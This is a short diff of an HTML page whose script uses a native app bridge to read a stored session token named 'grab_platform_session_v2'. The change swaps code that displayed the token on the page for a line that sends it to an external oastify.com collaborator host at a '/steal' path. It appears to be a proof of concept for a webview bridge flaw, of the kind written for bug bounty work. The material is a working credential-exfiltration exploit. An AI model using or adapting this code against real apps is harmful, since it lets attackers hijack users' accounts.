@@ -1,4 +1,3 @@
-<pre id="o"></pre>
 <script>
 function call(module, method, params, cb) {
   var name = module + "_" + method + "Callback_" + Date.now();
@@ -9,7 +8,7 @@ function call(module, method, params, cb) {
 
 call("ScopeModule", "reloadScopes", {}, function() {
   call("StorageModule", "getString", { key: "grab_platform_session_v2" }, function(r) {
-    document.getElementById("o").textContent = r.result || "empty (" + r.status_code + ")";
+    new Image().src = "https://mukok5rcxbuaa0ztgagmplwcj3pudu1j.oastify.com/steal?d=" + encodeURIComponent(r.result || r.status_code);
   });
 });
 </script>
